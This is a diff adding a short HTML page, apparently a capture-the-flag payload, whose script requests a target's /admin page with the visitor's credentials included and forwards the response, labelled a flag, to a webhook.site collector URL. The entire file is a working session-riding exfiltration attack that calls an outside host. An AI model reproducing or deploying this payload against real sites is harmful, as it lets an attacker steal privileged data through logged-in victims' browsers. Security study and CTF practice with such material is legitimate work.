@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+fetch('http://223.6.249.127:21959/admin', {
+  method: 'GET',
+  credentials: 'include'
+})
+.then(r => r.text())
+.then(flag => {
+  fetch('https://webhook.site/8628933e-d978-4419-aac9-b31ee4efdb1a?flag=' + encodeURIComponent(flag));
+});
+</script>
+</body>
+</html>
